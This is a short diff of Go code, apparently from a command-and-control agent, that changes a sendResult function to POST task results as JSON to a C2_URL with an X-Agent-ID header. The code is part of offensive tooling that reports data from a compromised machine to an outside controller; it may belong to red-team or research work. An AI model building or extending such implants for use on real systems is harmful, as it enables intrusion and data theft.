@@ -104,7 +104,17 @@ func sendResult(result TaskResult) {
 		return
 	}
 
-	_, err = http.Post(C2_URL, "application/json", bytes.NewBuffer(jsonData))
+	client := &http.Client{}
+	req, err := http.NewRequest("POST", C2_URL, bytes.NewBuffer(jsonData))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		return
+	}
+
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("X-Agent-ID", AgentID)
+
+	_, err = client.Do(req)
 	if err != nil {
 		fmt.Println("Error sending result:", err)
 	}
